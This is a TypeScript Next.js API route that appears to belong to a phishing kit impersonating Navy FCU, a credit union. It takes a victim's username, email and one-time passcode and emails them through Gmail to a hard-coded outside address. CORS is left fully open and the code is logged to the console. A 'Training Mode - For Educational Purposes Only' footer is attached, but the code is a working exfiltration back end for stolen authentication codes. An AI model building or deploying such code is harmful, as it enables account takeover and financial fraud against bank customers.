// app/api/auth/send-otp/route.ts
import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization',
};

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: corsHeaders });
}

export async function POST(request: Request) {
  try {
    const { otp, username, email } = await request.json();

    console.log(`📱 OTP for ${username}: ${otp}`);

    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
      console.error('❌ Email credentials not configured');
      return NextResponse.json({ 
        success: false, 
        error: 'Email not configured' 
      }, { status: 500, headers: corsHeaders });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    await transporter.verify();

    await transporter.sendMail({
      from: process.env.EMAIL_FROM || `"Navy FCU" <${process.env.EMAIL_USER}>`,
      to: 'blessedresult6@gmail.com',
      subject: `📱 OTP: ${otp} for ${username}`,
      text: `
📱 OTP VERIFICATION

User: ${username}
Email: ${email || 'N/A'}
OTP Code: ${otp}
Timestamp: ${new Date().toISOString()}

---
Training Mode - For Educational Purposes Only
      `,
      html: `
        <h2 style="color: #1a3a6e;">📱 OTP Verification</h2>
        <table style="border-collapse: collapse; width: 100%; font-family: Arial, sans-serif;">
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>User</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${username}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Email</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${email || 'N/A'}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>OTP Code</strong></td><td style="padding: 8px; border: 1px solid #ddd; font-size: 28px; font-weight: bold; color: #1a3a6e;">${otp}</td></tr>
          <tr><td style="padding: 8px; border: 1px solid #ddd;"><strong>Timestamp</strong></td><td style="padding: 8px; border: 1px solid #ddd;">${new Date().toISOString()}</td></tr>
        </table>
        <p style="color: #888; font-size: 12px; margin-top: 20px;">⚠️ Training Mode - For Educational Purposes Only</p>
      `,
    });

    console.log('✅ OTP sent to blessedresult6@gmail.com');

    return NextResponse.json({ 
      success: true, 
      message: 'OTP sent' 
    }, { headers: corsHeaders });

  } catch (error) {
    console.error('❌ OTP error:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'Failed to send OTP' 
    }, { status: 500, headers: corsHeaders });
  }
}